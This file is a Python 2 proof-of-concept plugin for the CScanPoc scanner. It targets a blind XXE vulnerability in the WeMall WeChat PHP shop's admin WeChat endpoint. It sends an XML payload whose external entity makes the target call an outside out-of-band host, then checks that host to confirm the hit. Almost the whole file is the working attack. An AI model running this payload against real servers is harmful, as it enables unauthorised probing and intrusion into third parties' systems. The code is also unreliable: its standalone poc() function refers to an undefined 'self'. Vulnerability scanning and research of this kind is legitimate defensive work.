# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2, random, socket, urlparse
socket.setdefaulttimeout(10)

class Vuln(ABVuln):
    vuln_id = 'WeMall_0001' # 平台漏洞编号，留空
    name = 'WeMall微信开源PHP商城系统一处blind xxe' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-10-19'  # 漏洞公布时间
    desc = '''
        //Application\Lib\Action\Admin\WechatAction.class.php
        valid()函数，直接使用了simplexml_load_string函数。
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/3528/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'WeMall'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


def send_xml(url,data):
    try:
        requests.post(url,data)

    except Exception, e:
        print e


def poc(host):
    url = 'http://' + host + '/index.php?g=Admin&m=Wechat&a=index'
    key = "".join(random.sample('abcdefghijklmnopqrstuvwxyz', 6))
    value = "".join(random.sample('abcdefghijklmnopqrstuvwxyz', 6))

    data = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [

        <!ENTITY % remote SYSTEM "http://pysandbox.sinaapp.com/kv?act=set&k={key}&v={value}">

        %remote;]>
        <root/>
    """

    data = data.replace('{key}', key).replace('{value}', value)
    send_xml(url, data)
    url = 'http://pysandbox.sinaapp.com/kv?act=get&k=' + key
    res = urllib2.urlopen(url).read()

    if value in res:
        print "xxe"
        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
            target=self.target,name=self.vuln.name))


class Poc(ABPoc):
    poc_id = '8d5c709f-5c4a-4f6e-8921-564451a8165c'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            o = urlparse.urlparse(self.target)
            host = o.hostname
            poc(host)

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()